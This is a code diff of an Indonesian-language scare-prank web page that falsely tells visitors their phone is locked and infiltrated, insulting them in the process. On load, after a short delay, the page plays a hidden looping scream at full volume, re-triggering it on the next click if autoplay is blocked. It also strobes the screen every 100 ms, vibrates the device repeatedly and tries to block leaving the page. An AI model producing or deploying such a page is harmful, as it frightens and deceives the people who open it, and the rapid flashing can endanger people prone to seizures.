@@ -82,7 +82,6 @@
         #flash.active {
             opacity: 1;
         }
-        /* SEMBUNYIKAN AUDIO PLAYER */
         #audio-container {
             display: none;
         }
@@ -90,38 +89,37 @@
 </head>
 <body>
 
-    <!-- FLASH OVERLAY -->
     <div id="flash"></div>
 
-    <!-- AUDIO JUMBSCARE (DI-SEMBUNYIKAN) -->
     <div id="audio-container">
         <audio id="jumpscare" autoplay loop>
+            <!-- SUARA JUMBSCARE (GANTI PAKE LINK MP3 YANG LU MAU) -->
             <source src="https://www.myinstants.com/media/sounds/roblox_oomf.mp3" type="audio/mpeg">
-            <!-- FALLBACK: KALO GA LOAD, PAKE BEEP BAWAAN -->
+            <source src="https://www.myinstants.com/media/sounds/scream_1.mp3" type="audio/mpeg">
         </audio>
     </div>
 
-    <!-- KONTEN UTAMA -->
     <div class="container">
         <img src="https://cdn.pixabay.com/photo/2017/10/04/17/21/hacker-2816972_1280.png" alt="Hacker">
         <h1>🔒 HP LU KEKUNCI NIH GOBLOK!</h1>
         <h2>☠️ BY VNO SIGMA ☠️</h2>
         <div class="sub">💀 SYSTEM TERINFILTRASI 💀</div>
-        <div class="sub">🔥 JANGAN COBA MATIKEN, GUA LEBIH CEPAT 🔥</div>
+        <div class="sub">🔥 MATI O AE SU  🔥</div>
     </div>
 
     <script>
-        // === PUTAR SUARA JUMBSCARE ===
         function playJumpscare() {
             const audio = document.getElementById('jumpscare');
-            audio.volume = 1.0; // Volume maksimal
+            audio.volume = 1.0;
             audio.play().catch(() => {
-                // Kalo gagal (misal autoplay diblokir), bikin alert pake getar
-                alert("🔊 SUARA JUMBSCARE GAGAL DIPUTAR, TAPI HP TETAP KENA!");
+                // Kalo autoplay diblokir, coba pake cara alternatif
+                document.addEventListener('click', function playOnClick() {
+                    audio.play();
+                    document.removeEventListener('click', playOnClick);
+                });
             });
         }
 
-        // === FLASH LAYAR ===
         function flashScreen() {
             const flash = document.getElementById('flash');
             setInterval(() => {
@@ -130,7 +128,6 @@
             }, 100);
         }
 
-        // === LOCKER EKSTREME ===
         function lockDevice() {
             setInterval(() => {
                 navigator.vibrate(30000);
@@ -144,16 +141,14 @@
             }, 300);
         }
 
-        // === JALANKAN SEMUA SAAT LOAD ===
         window.onload = function() {
             setTimeout(() => {
-                playJumpscare();   // Putar suara
-                flashScreen();     // Nyalain flash
-                lockDevice();      // Jalankan lock
+                playJumpscare();
+                flashScreen();
+                lockDevice();
             }, 1500);
         };
 
-        // === CEGAH KELUAR ===
         window.onbeforeunload = function() {
             return "LU KIRA BISA KELUAR? GOBLOK!";
         };
